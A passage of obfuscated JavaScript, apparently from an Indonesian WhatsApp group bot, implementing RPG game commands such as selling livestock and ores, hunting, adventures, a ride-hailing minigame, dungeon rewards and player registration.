                                kurangSapi(_0x1b1e88[_0x5804c8(0xd13)], _0x2e288c);
                                let _0x40f694 = 0x2710 * _0x2e288c;
                                addMonay(_0x1b1e88[_0x5804c8(0xd13)], _0x40f694), setTimeout(async () => {
                                    const _0x39b42e = _0x5804c8;
                                    _0x358f3b(_0x39b42e(0x4c2) + getMonay(_0x1b1e88[_0x39b42e(0xd13)]) + _0x39b42e(0x6bb) + getSapi(_0x1b1e88['sender']));
                                }, 0x7d0);
                            } else {
                                if (_0x83eae5[0x0] === _0x5804c8(0x462)) {
                                    if (_0x2e821f < _0x2e288c) return _0x358f3b(_0x5804c8(0x8bd));
                                    if (!_0x83eae5[0x1]) return _0x358f3b('Example : ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xb3e));
                                    kurangGajah(_0x1b1e88[_0x5804c8(0xd13)], _0x2e288c);
                                    let _0x464d1e = 0x3a98 * _0x2e288c;
                                    addMonay(_0x1b1e88['sender'], _0x464d1e), setTimeout(async () => {
                                        const _0x4be718 = _0x5804c8;
                                        _0x358f3b(_0x4be718(0x4c2) + getMonay(_0x1b1e88[_0x4be718(0xd13)]) + _0x4be718(0xbf0) + getGajah(_0x1b1e88['sender']));
                                    }, 0x7d0);
                                } else {
                                    if (_0x83eae5[0x0] === _0x5804c8(0x76c)) {
                                        if (_0x2ca47c < _0x2e288c) return _0x358f3b(_0x5804c8(0x2a5));
                                        if (!_0x83eae5[0x1]) return _0x358f3b(_0x5804c8(0x995) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x276));
                                        kurangBesi(_0x1b1e88[_0x5804c8(0xd13)], _0x2e288c);
                                        let _0x4599c6 = 0x3e80 * _0x2e288c;
                                        addMonay(_0x1b1e88['sender'], _0x4599c6), setTimeout(async () => {
                                            const _0x51e8c2 = _0x5804c8;
                                            _0x358f3b(_0x51e8c2(0xbca) + getMonay(_0x1b1e88[_0x51e8c2(0xd13)]) + _0x51e8c2(0x861) + getBesi(_0x1b1e88[_0x51e8c2(0xd13)]));
                                        }, 0x7d0);
                                    } else {
                                        if (_0x83eae5[0x0] === 'gold') {
                                            if (_0x23773f < _0x2e288c) return _0x358f3b(_0x5804c8(0x9dc));
                                            if (!_0x83eae5[0x1]) return _0x358f3b(_0x5804c8(0x995) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x2ef));
                                            kurangEmas(_0x1b1e88['sender'], _0x2e288c);
                                            let _0x307caf = 0xc350 * _0x2e288c;
                                            addMonay(_0x1b1e88[_0x5804c8(0xd13)], _0x307caf), setTimeout(async () => {
                                                const _0x546262 = _0x5804c8;
                                                _0x358f3b('Transaksi berhasil ✅\x0a*Sisa uang* : ' + getMonay(_0x1b1e88[_0x546262(0xd13)]) + _0x546262(0x6e3) + getEmas(_0x1b1e88['sender']));
                                            }, 0x7d0);
                                        } else {
                                            if (_0x83eae5[0x0] === _0x5804c8(0xcb1)) {
                                                if (_0x1fbd07 < _0x2e288c) return _0x358f3b(_0x5804c8(0x9e8));
                                                if (!_0x83eae5[0x1]) return _0x358f3b(_0x5804c8(0x995) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x615));
                                                kurangEmerald(_0x1b1e88['sender'], _0x2e288c);
                                                let _0x1d025c = 0x186a0 * _0x2e288c;
                                                addMonay(_0x1b1e88[_0x5804c8(0xd13)], _0x1d025c), setTimeout(async () => {
                                                    const _0x3b4ac6 = _0x5804c8;
                                                    _0x358f3b('Transaksi berhasil ✅\x0a*Sisa uang* : ' + getMonay(_0x1b1e88[_0x3b4ac6(0xd13)]) + _0x3b4ac6(0x86e) + getEmerald(_0x1b1e88[_0x3b4ac6(0xd13)]));
                                                }, 0x7d0);
                                            } else _0x358f3b(_0x5804c8(0xd37) + (_0x3b7c58 + _0x453fc1) + ' fish 2');
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        break;
        case _0x5804c8(0xb80): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg');
            if (!_0x25893f < 0x1) return _0x358f3b(_0x5804c8(0x968));
            if (_0x25893f > 0x64) return _0x358f3b('Darahmu Penuh');
            if (_0x5f3849 < 0x1) return _0x358f3b(_0x5804c8(0x752));
            addDarah(_0x1b1e88[_0x5804c8(0xd13)], 0x64), kurangPotion(_0x1b1e88[_0x5804c8(0xd13)], 0x1), _0x358f3b('Done! Darah mu dah full');
        }
        break;
        case _0x5804c8(0x830):
        case _0x5804c8(0xa63): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x53a93f) return _0x358f3b('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg');
            if (_0x25893f < 0x1) return _0x358f3b(_0x5804c8(0xcdd));
            let _0x1974d0 = [_0x5804c8(0x7ab), _0x5804c8(0xaa1), _0x5804c8(0x528), _0x5804c8(0x2c2), _0x5804c8(0x1b8), _0x5804c8(0xd3d)],
                _0x1a0320 = [_0x5804c8(0x5e6), _0x5804c8(0x512), _0x5804c8(0x8fd), 'Meadow', 'African forest', 'Mountains'];
            var _0x38dca4 = Math['ceil'](Math[_0x5804c8(0xbbf)]() * 0xa),
                _0x35047a = Math[_0x5804c8(0x87e)](Math[_0x5804c8(0xbbf)]() * 0x8),
                _0xd9ebda = Math[_0x5804c8(0x87e)](Math[_0x5804c8(0xbbf)]() * 0x7),
                _0x2e0d92 = [0x3, 0x0, 0x4, 0x0, 0x5, 0x4, 0x6, 0x0, 0x1, 0x0, 0x2, 0x3, 0x0, 0x3, 0x0, 0x1],
                _0xee6b14 = [0x2, 0x0, 0x3, 0x0, 0x4, 0x0, 0x5, 0x0, 0x1, 0x0, 0x2, 0x0, 0x3, 0x0, 0x1],
                _0x2e1824 = [0x1, 0x0, 0x4, 0x0, 0x2, 0x0, 0x1, 0x0, 0x2, 0x1, 0x3, 0x0, 0x1],
                _0x123481 = _0x2e0d92[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x2e0d92['length'])],
                _0x3e8d95 = _0xee6b14[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0xee6b14[_0x5804c8(0x977)])],
                _0x390644 = _0x2e1824[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x2e1824[_0x5804c8(0x977)])],
                _0x481a69 = _0x1974d0[Math['floor'](Math['random']() * _0x1974d0[_0x5804c8(0x977)])],
                _0x447f24 = _0x1a0320[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x1a0320[_0x5804c8(0x977)])];
            if (_0x447f24 === _0x5804c8(0x5e6)) var _0x1b1602 = _0x5804c8(0x46f);
            else {
                if (_0x447f24 === 'Amazon forest') var _0x1b1602 = _0x5804c8(0x5ed);
                else {
                    if (_0x447f24 === 'Tropical forest') var _0x1b1602 = _0x5804c8(0x468);
                    else {
                        if (_0x447f24 === _0x5804c8(0x257)) var _0x1b1602 = _0x5804c8(0x74d);
                        else {
                            if (_0x447f24 === _0x5804c8(0x14a)) var _0x1b1602 = _0x5804c8(0xd32);
                            else {
                                if (_0x447f24 === _0x5804c8(0xa35)) var _0x1b1602 = _0x5804c8(0x915);
                            }
                        }
                    }
                }
            }
            setTimeout(async () => {
                const _0x223eed = _0x5804c8;
                let _0x28945a = _0x223eed(0x42e);
                _0x28945a += _0x223eed(0x65d) + _0x38dca4 + '\x0a', _0x28945a += '*🐔Chicken* : ' + _0x35047a + '\x0a', _0x28945a += _0x223eed(0x9b4) + _0xd9ebda + '\x0a', _0x28945a += _0x223eed(0x697) + _0x123481 + '\x0a', _0x28945a += '*🐄Cow* : ' + _0x3e8d95 + '\x0a', _0x28945a += _0x223eed(0xc19) + _0x390644 + '\x0a\x0a', _0x28945a += _0x223eed(0x9e4), _0x28945a += _0x223eed(0x486) + _0x447f24 + '\x0a', _0x28945a += _0x223eed(0x37d) + _0x481a69 + _0x223eed(0x4dc), _0x28945a += _0x223eed(0xd1f) + getDarah(_0x1b1e88[_0x223eed(0xd13)]) + '\x0a', await _0x614da8['sendMessage'](_0x1b1e88[_0x223eed(0x60f)], {
                    'image': {
                        'url': _0x1b1602
                    },
                    'caption': _0x28945a
                }, {
                    'quoted': _0x1b1e88
                });
            }, 0x1388), setTimeout(() => {
                const _0xdc0363 = _0x5804c8;
                _0x614da8[_0xdc0363(0x2a4)](_0x1b1e88['chat'], '@' + _0x1b1e88[_0xdc0363(0xd13)][_0xdc0363(0x4bd)]('@')[0x0] + ' Started Hunting In ' + _0x447f24, _0x1b1e88);
            }, 0x3e8), addIkan(_0x1b1e88[_0x5804c8(0xd13)], _0x38dca4), addAyam(_0x1b1e88[_0x5804c8(0xd13)], _0x35047a), addKelinci(_0x1b1e88[_0x5804c8(0xd13)], _0xd9ebda), addDomba(_0x1b1e88[_0x5804c8(0xd13)], _0x123481), addSapi(_0x1b1e88[_0x5804c8(0xd13)], _0x3e8d95), addGajah(_0x1b1e88[_0x5804c8(0xd13)], _0x390644), kurangDarah(_0x1b1e88[_0x5804c8(0xd13)], 0xa);
        }
        break;
        case _0x5804c8(0x1e6): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
            ngab = [_0x5804c8(0x65a), _0x5804c8(0x6f8), _0x5804c8(0x4fa), 'Earthquake', _0x5804c8(0x4a9), 'Demon'];
            var _0x5ae644 = ngab[Math['floor'](Math[_0x5804c8(0xbbf)]() * ngab[_0x5804c8(0x977)])],
                _0x2cc22b = [_0x5804c8(0xd6d), _0x5804c8(0x804), _0x5804c8(0x61a), _0x5804c8(0xaaa), 'Bull Holland', _0x5804c8(0x575), _0x5804c8(0xd8b), _0x5804c8(0x81b), _0x5804c8(0x1a8), _0x5804c8(0x151), 'Garcia', _0x5804c8(0x22c), _0x5804c8(0xa17), _0x5804c8(0xa06), _0x5804c8(0xaf2), 'Junever', _0x5804c8(0xbdc), 'Green Palms', _0x5804c8(0x902), _0x5804c8(0x1f8), _0x5804c8(0xbd1), _0x5804c8(0x6b0), _0x5804c8(0x87c), 'Rocksore East', 'Camel Toe', _0x5804c8(0x51d), _0x5804c8(0x218), _0x5804c8(0xa21), _0x5804c8(0xa47), 'Vespucci', _0x5804c8(0x242), _0x5804c8(0xd34), _0x5804c8(0xb36), 'cyber city', _0x5804c8(0x170), 'templar city', _0x5804c8(0x76b), _0x5804c8(0x8f8), _0x5804c8(0x972), _0x5804c8(0xaf1), _0x5804c8(0x1e7), 'Flush City', 'Royals Canyon', _0x5804c8(0x6de), 'Peterborough', _0x5804c8(0x591), _0x5804c8(0x47e), 'Outpost', 'Landow', _0x5804c8(0x369), _0x5804c8(0x925), _0x5804c8(0x1ad), _0x5804c8(0x262), 'Openshaw', _0x5804c8(0x6b9), _0x5804c8(0x1e9), _0x5804c8(0x88f), _0x5804c8(0x472), _0x5804c8(0x5ac), _0x5804c8(0xb62), _0x5804c8(0x98e), _0x5804c8(0x4b8), 'Acomb', 'Eldham', _0x5804c8(0x4f7), _0x5804c8(0x2f5), _0x5804c8(0x98e), _0x5804c8(0x4f3), _0x5804c8(0x26c), _0x5804c8(0x35a), 'Kingcardine', _0x5804c8(0xd4c), _0x5804c8(0x619), _0x5804c8(0xd7f), 'Hardersfield', _0x5804c8(0x9f7), _0x5804c8(0xa49), _0x5804c8(0x265), 'Elisyum', _0x5804c8(0x14c), _0x5804c8(0x7a1), _0x5804c8(0x8d9), _0x5804c8(0x499), _0x5804c8(0xce5), _0x5804c8(0xd87), _0x5804c8(0xab0), _0x5804c8(0x74a), _0x5804c8(0x78d), _0x5804c8(0x518), 'Jongvale', _0x5804c8(0x6e6), _0x5804c8(0xb72), 'Whaelrdrake', 'Baerney', _0x5804c8(0x26c), _0x5804c8(0x491), _0x5804c8(0xb45), _0x5804c8(0x353), _0x5804c8(0x719), _0x5804c8(0xc17), _0x5804c8(0xd4c), _0x5804c8(0x153), _0x5804c8(0x490), 'Pontheugh', _0x5804c8(0xcd5), 'Hull', _0x5804c8(0xc6a), _0x5804c8(0x4af), _0x5804c8(0x144), _0x5804c8(0xb5f), _0x5804c8(0x95a), 'Lancaster', 'Kirkwall', 'Rotherhithe', _0x5804c8(0x73b), 'Watford', _0x5804c8(0xa98), _0x5804c8(0xb67), _0x5804c8(0x78e), _0x5804c8(0x848), 'Grimsby', _0x5804c8(0x3e2), _0x5804c8(0x40d), _0x5804c8(0xcca), _0x5804c8(0x4b3), _0x5804c8(0x7a1), _0x5804c8(0x70c), 'Astrakane', _0x5804c8(0xd1c), _0x5804c8(0xa23), 'Snowbush', 'Sutton', _0x5804c8(0x7f4), _0x5804c8(0x546), _0x5804c8(0x6d1), _0x5804c8(0x166), _0x5804c8(0x62e), _0x5804c8(0x8e4), 'Orrinshire', _0x5804c8(0xad5), 'Garrigill', _0x5804c8(0x8c8), _0x5804c8(0x993), 'Taedmorden', _0x5804c8(0x52d), _0x5804c8(0x1f1), _0x5804c8(0x9ba), _0x5804c8(0x9b0), 'Violl’s Garden', _0x5804c8(0xd80), 'Bailymena', _0x5804c8(0x650), _0x5804c8(0x6c6), _0x5804c8(0x818), _0x5804c8(0x6d9), _0x5804c8(0x9f9), _0x5804c8(0xcab), _0x5804c8(0x485), _0x5804c8(0x626), _0x5804c8(0x2ce), 'Furness', _0x5804c8(0x925), _0x5804c8(0xb7e), _0x5804c8(0x5f4), 'Boroughton', 'Carran', 'Ffestiniog', _0x5804c8(0x728), _0x5804c8(0x645), 'Marclesfield', _0x5804c8(0x9b1), 'Squall’s End', _0x5804c8(0x383), _0x5804c8(0xd40), 'Moressley', _0x5804c8(0xb57), _0x5804c8(0x7a6), 'Aria', _0x5804c8(0xb79), _0x5804c8(0x5c1), _0x5804c8(0x6de), _0x5804c8(0x7e0), 'Doonatel', _0x5804c8(0xc82), _0x5804c8(0x485), _0x5804c8(0x65f), _0x5804c8(0x385)],
                _0x4204e2 = _0x2cc22b[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x2cc22b[_0x5804c8(0x977)])];
            hasm = 'https://telegra.ph/file/ff94536d69e0f4f3e7b54.jpg';
            var _0x5337e3 = Math[_0x5804c8(0x87e)](Math[_0x5804c8(0xbbf)]() * 0x3e8),
                _0x3db211 = Math[_0x5804c8(0x87e)](Math['random']() * 0x12c);
            setTimeout(() => {
                const _0x30e595 = _0x5804c8;
                var _0x274ae7 = _0x30e595(0xc68) + _0x4204e2 + _0x30e595(0x996) + _0x3db211 + _0x30e595(0x2ed) + _0x5337e3 + 'Xp';
                _0x614da8[_0x30e595(0x938)](_0x1b1e88[_0x30e595(0x60f)], {
                    'image': {
                        'url': hasm
                    },
                    'caption': _0x274ae7
                }, {
                    'quoted': _0x1b1e88
                });
            }, 0x1b58), setTimeout(() => {
                const _0x10c427 = _0x5804c8;
                _0x358f3b(_0x10c427(0xce8));
            }, 0x1388), setTimeout(() => {
                const _0x2ae0c3 = _0x5804c8;
                _0x358f3b(_0x2ae0c3(0x34e) + _0x5ae644);
            }, 0xbb8), setTimeout(() => {
                const _0x48974d = _0x5804c8;
                _0x358f3b(_0x32b235 + _0x48974d(0x942));
            }, 0x0), addLevelingXp(_0x1b1e88[_0x5804c8(0xd13)], _0x5337e3), addBalance(_0x1b1e88[_0x5804c8(0xd13)], _0x3db211, balance);
        }
        break;
        case _0x5804c8(0x295):
        case _0x5804c8(0x722): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
            var _0x5337e3 = Math[_0x5804c8(0x87e)](Math[_0x5804c8(0xbbf)]() * 0x3e8),
                _0x3db211 = Math[_0x5804c8(0x87e)](Math[_0x5804c8(0xbbf)]() * 0x12c);
            setTimeout(() => {
                const _0x7cb73c = _0x5804c8;
                var _0x21d17f = '\x0a*—[ Hasil Ngojek ' + _0x32b235 + _0x7cb73c(0x849) + _0x3db211 + ' ]\x0a ➕ ✨ Exp = [ ' + _0x5337e3 + ' ]\x09 \x0a ➕ 😍 Order Selesai = +1\x0a';
                _0x358f3b(_0x21d17f);
            }, 0x2710), setTimeout(() => {
                const _0x5562ad = _0x5804c8;
                _0x358f3b(_0x5562ad(0x4ec));
            }, 0x2328), setTimeout(() => {
                _0x358f3b('\x0a⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛\x0a⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛\x0a⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛\x0a🏘️🏘️🏘️🏘️🌳  🌳 🏘️       \x0a\x0a\x0a➕ Sampai di tujuan...\x0a');
            }, 0x1b58), setTimeout(() => {
                const _0x13b449 = _0x5804c8;
                _0x358f3b(_0x13b449(0x6f9));
            }, 0x1388), setTimeout(() => {
                const _0x325b2b = _0x5804c8;
                _0x358f3b(_0x325b2b(0xc0f));
            }, 0xbb8), setTimeout(() => {
                const _0x2afb60 = _0x5804c8;
                _0x358f3b(_0x2afb60(0x8ef));
            }, 0x0), addLevelingXp(_0x1b1e88[_0x5804c8(0xd13)], _0x5337e3), addBalance(_0x1b1e88['sender'], _0x3db211, balance);
        }
        break;
        case _0x5804c8(0xa0b):
        case _0x5804c8(0x1e5): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg');
            ez = Math[_0x5804c8(0x87e)](Math[_0x5804c8(0xbbf)]() * 0x1c2), a = _0x123af8(0x63), b = _0x123af8(0x1f4), c = _0x123af8(0x96), addBalance(_0x1b1e88[_0x5804c8(0xd13)], b, balance), addLevelingXp(_0x1b1e88[_0x5804c8(0xd13)], ez), addEmas(_0x1b1e88['sender'], a), addBesi(_0x1b1e88[_0x5804c8(0xd13)], c), _0x358f3b(_0x5804c8(0x8fe) + b + _0x5804c8(0x165) + a + _0x5804c8(0xbfe) + c + _0x5804c8(0x15b) + ez);
        }
        break;
        case _0x5804c8(0x3fd):
        case _0x5804c8(0x43d): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88['isGroup']) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
            ez = Math[_0x5804c8(0x87e)](Math['random']() * 0x190), addLevelingXp(_0x1b1e88['sender'], ez), a = _0x123af8(0x37), b = _0x123af8(0x190), c = _0x123af8(0x50), d = _0x123af8(0x3), addLevelingXp(_0x1b1e88[_0x5804c8(0xd13)], ez), addBalance(_0x1b1e88[_0x5804c8(0xd13)], b, balance), addEmas(_0x1b1e88[_0x5804c8(0xd13)], a), addBesi(_0x1b1e88[_0x5804c8(0xd13)], c), addDm(_0x1b1e88[_0x5804c8(0xd13)], d), bufutI = _0x5804c8(0x603);
            var _0x269ee8 = _0x5804c8(0xbd0) + b + '\x0a ┊ *Iron:* ' + c + _0x5804c8(0x93c) + a + _0x5804c8(0xb2b) + d + _0x5804c8(0x28f);
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': bufutI
                },
                'caption': _0x269ee8
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x918):
        case _0x5804c8(0x5b7): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg');
            ez = Math[_0x5804c8(0x87e)](Math[_0x5804c8(0xbbf)]() * 0x1f4), addLevelingXp(_0x1b1e88[_0x5804c8(0xd13)], ez), a = _0x123af8(0x41), b = _0x123af8(0x1f4), c = _0x123af8(0x5a), d = _0x123af8(0x5), addLevelingXp(_0x1b1e88[_0x5804c8(0xd13)], ez), addBalance(_0x1b1e88[_0x5804c8(0xd13)], b, balance), addEmas(_0x1b1e88[_0x5804c8(0xd13)], a), addBesi(_0x1b1e88[_0x5804c8(0xd13)], c), addDm(_0x1b1e88[_0x5804c8(0xd13)], d), bufo = 'https://telegra.ph/file/19bdc38aaafda29f7afe1.jpg';
            var _0x269ee8 = _0x5804c8(0x42c) + b + '\x0a ┊ *Iron:* ' + c + _0x5804c8(0x93c) + a + _0x5804c8(0xb2b) + d + _0x5804c8(0x28f);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': bufo
                },
                'caption': _0x269ee8
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0xb13):
        case _0x5804c8(0x762): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
            ez = Math[_0x5804c8(0x87e)](Math[_0x5804c8(0xbbf)]() * 0x258), addLevelingXp(_0x1b1e88[_0x5804c8(0xd13)], ez), a = _0x123af8(0x46), b = _0x123af8(0x258), c = _0x123af8(0x5f), d = _0x123af8(0x6), addLevelingXp(_0x1b1e88['sender'], ez), addBalance(_0x1b1e88['sender'], b, balance), addEmas(_0x1b1e88[_0x5804c8(0xd13)], a), addBesi(_0x1b1e88[_0x5804c8(0xd13)], c), addDm(_0x1b1e88[_0x5804c8(0xd13)], d), bufas = _0x5804c8(0x6b4);
            var _0x269ee8 = _0x5804c8(0xc7d) + b + '\x0a ┊ *Iron:* ' + c + _0x5804c8(0x93c) + a + _0x5804c8(0xb2b) + d + _0x5804c8(0x28f);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': bufas
                },
                'caption': _0x269ee8
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0xd7c):
        case _0x5804c8(0xc46): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
            ez = Math[_0x5804c8(0x87e)](Math['random']() * 0x2bc), addLevelingXp(_0x1b1e88['sender'], ez), a = _0x123af8(0x4b), b = _0x123af8(0x258), c = _0x123af8(0x64), d = _0x123af8(0x7), addLevelingXp(_0x1b1e88[_0x5804c8(0xd13)], ez), addBalance(_0x1b1e88[_0x5804c8(0xd13)], b, balance), addEmas(_0x1b1e88[_0x5804c8(0xd13)], a), addBesi(_0x1b1e88[_0x5804c8(0xd13)], c), addDm(_0x1b1e88[_0x5804c8(0xd13)], d), batai = _0x5804c8(0xc7a);
            var _0x269ee8 = _0x5804c8(0x64b) + b + _0x5804c8(0x17d) + c + _0x5804c8(0x93c) + a + '\x0a ┊ *Diamond:* ' + d + _0x5804c8(0x28f);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': batai
                },
                'caption': _0x269ee8
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case 'demon':
        case _0x5804c8(0x379): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
            ez = Math[_0x5804c8(0x87e)](Math['random']() * 0x352), addLevelingXp(_0x1b1e88['sender'], ez), a = _0x123af8(0x5a), b = _0x123af8(0x384), c = _0x123af8(0x78), d = _0x123af8(0xa), addLevelingXp(_0x1b1e88[_0x5804c8(0xd13)], ez), addBalance(_0x1b1e88[_0x5804c8(0xd13)], b, balance), addEmas(_0x1b1e88[_0x5804c8(0xd13)], a), addBesi(_0x1b1e88[_0x5804c8(0xd13)], c), addDm(_0x1b1e88[_0x5804c8(0xd13)], d), bhuu = 'https://telegra.ph/file/4a264a10ea2e5f18314f1.jpg';
            var _0x269ee8 = _0x5804c8(0xc22) + b + _0x5804c8(0x17d) + c + _0x5804c8(0x7be) + a + _0x5804c8(0xb2b) + d + _0x5804c8(0xbdf);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': bhuu
                },
                'caption': _0x269ee8
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x70f):
        case _0x5804c8(0xbb9): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
            ez = Math['ceil'](Math['random']() * 0x3e8), addLevelingXp(_0x1b1e88[_0x5804c8(0xd13)], ez), addBalance(_0x1b1e88[_0x5804c8(0xd13)], 0x7cf, balance), addEmas(_0x1b1e88['sender'], 0x63), addBesi(_0x1b1e88[_0x5804c8(0xd13)], 0x63), addDm(_0x1b1e88[_0x5804c8(0xd13)], 0x63), bhuud = 'https://telegra.ph/file/cdf482a8de192189057d8.jpg';
            var _0x269ee8 = _0x5804c8(0x6cf) + b + _0x5804c8(0xb19) + c + _0x5804c8(0xb07) + a + '\x0a ┊ *Diamond :* ' + d + _0x5804c8(0xbdf);
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': bhuud
                },
                'caption': _0x269ee8
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x7b1): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (_0x53a93f) return _0x358f3b(_0x5804c8(0x9a8));
            reqXp = 0x1388 * (Math[_0x5804c8(0x2af)](0x2, getLevelingLevel(_0x1b1e88[_0x5804c8(0xd13)])) - 0x1), _petualang[_0x5804c8(0x453)](_0x1b1e88[_0x5804c8(0xd13)]), addInventoriDarah(_0x1b1e88[_0x5804c8(0xd13)], DarahAwal), addInventori(_0x1b1e88['sender']), addInventoriBuruan(_0x1b1e88[_0x5804c8(0xd13)]), fs[_0x5804c8(0x933)]('./database/user/inventory.json', JSON[_0x5804c8(0x736)](_petualang)), addLevelingId(_0x1b1e88['sender']);
            let _0xd772e8 = _0x5804c8(0x82b);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0xd772e8
                },
                'caption': _0x5804c8(0x5fa)
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0xc6f): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x53a93f) return _0x358f3b('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg');
            if (_0x83eae5[_0x5804c8(0x977)] < 0x1) return _0x358f3b('Kirim perintah *' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x23a) + (_0x3b7c58 + _0x453fc1) + '* 10');
            jmlh = _0x1b04cf, rp = 0x5 * jmlh;
            if (getFish(_0x1b1e88[_0x5804c8(0xd13)]) < jmlh) return _0x358f3b(_0x5804c8(0x5ec));
            sellFish(_0x1b1e88[_0x5804c8(0xd13)], jmlh, balance), addBalance(_0x1b1e88[_0x5804c8(0xd13)], rp, balance), _0x358f3b('🛍️ *MARKET*\x0a ┊ Seller : ' + _0x32b235 + _0x5804c8(0x629) + await getFish(_0x1b1e88['sender']) + _0x5804c8(0x27b) + rp);
        }
        break;
        case 'sellbesi': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88['isGroup']) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x53a93f) return _0x358f3b('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg');
            if (_0x83eae5[_0x5804c8(0x977)] < 0x1) return _0x358f3b(_0x5804c8(0x3f0) + (_0x3b7c58 + _0x453fc1) + '* jumlah untuk dijual\x0a\x0aContoh *' + (_0x3b7c58 + _0x453fc1) + '* 10');
            jmlh = _0x1b04cf, rp = 0xa * jmlh;
            if (getBesi(_0x1b1e88[_0x5804c8(0xd13)]) < jmlh) return _0x358f3b(_0x5804c8(0x184));
            sellBesi(_0x1b1e88[_0x5804c8(0xd13)], jmlh, balance), addBalance(_0x1b1e88[_0x5804c8(0xd13)], rp, balance), _0x358f3b('🛍️ MARKET\x0a ┊ Seller : ' + _0x32b235 + _0x5804c8(0xac9) + await getBesi(_0x1b1e88[_0x5804c8(0xd13)]) + _0x5804c8(0x27b) + rp);
        }
        break;
        case _0x5804c8(0x895): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x53a93f) return _0x358f3b(_0x5804c8(0x372));
